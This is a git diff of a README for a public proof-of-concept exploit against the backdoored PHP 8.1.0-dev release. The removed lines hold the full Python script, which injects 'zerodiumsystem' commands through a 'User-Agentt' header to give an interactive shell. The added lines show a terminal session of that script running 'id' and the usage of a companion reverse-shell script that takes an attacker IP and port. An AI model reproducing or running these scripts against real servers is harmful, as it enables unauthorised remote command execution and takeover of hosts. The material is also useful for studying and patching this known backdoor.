@@ -14,7 +14,9 @@ _Read full article: https://flast101.github.io/php-8.1.0-dev-backdoor-rce/_
 
 ## POC Script
 
-This short exploit script uses the backdoor to provide a pseudo system shell on the host.
+This short exploit script [backdoor_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/backdoor_php_8.1.0-dev.py) uses the backdoor to provide a pseudo system shell on the host.
+
+It has the number [49933](https://www.exploit-db.com/exploits/49933) on [Exploit DB](https://www.exploit-db.com/exploits/49933).   
 
 - **Exploit Title:** PHP 8.1.0-dev Backdoor Remote Code Execution    
 - **Date:** 23 may 2021   
@@ -29,41 +31,39 @@ This short exploit script uses the backdoor to provide a pseudo system shell on 
 
 
 
-The following exploit uses the backdoor to provide a pseudo system shell on the host.
+Usage:
 
 
-```python
-#!/usr/bin/env python3
-import os
-import re
-import requests
+```
+┌──(user㉿kali)-[~/Documents]
+└─$ python3 backdoor_php_8.1.0-dev.py
+  
+Enter the full host url:
+http://a.b.c.d
 
-host = input("Enter the full host url:\n")
-request = requests.Session()
-response = request.get(host)
+Interactive shell is opened on http://http://a.b.c.d 
+Can't acces tty; job crontol turned off.
+$ id
+uid=1000(user) gid=1000(user) groups=1000(user)
 
-if str(response) == '<Response [200]>':
-    print("\nInteractive shell is opened on", host, "\nCan't access tty; job crontol turned off.")
-    try:
-        while 1:
-            cmd = input("$ ")
-            headers = {
-            "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:78.0) Gecko/20100101 Firefox/78.0",
-            "User-Agentt": "zerodiumsystem('" + cmd + "');"
-            }
-            response = request.get(host, headers = headers, allow_redirects = False)
-            current_page = response.text
-            stdout = current_page.split('<!DOCTYPE html>',1)
-            text = print(stdout[0])
-    except KeyboardInterrupt:
-        print("Exiting...")
-        exit
-
-else:
-    print("\r")
-    print(response)
-    print("Host is not available, aborting...")
-    exit
+$
 ```
 
-Be Curious, Learning is Life !
+* * * 
+
+## Reverse Shell    
+
+This short exploit script [revshell_php_8.1.0-dev.py](https://github.com/flast101/php-8.1.0-dev-backdoor-rce/blob/main/revshell_php_8.1.0-dev.py) gives a reverse shell on target.
+
+
+Usage:
+
+
+```
+┌──(user㉿kali)-[~/Documents]
+└─$ python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>
+```
+
+![docs/revshell-script.png](docs/revshell-script.png "docs/revshell-script.png")
+
+
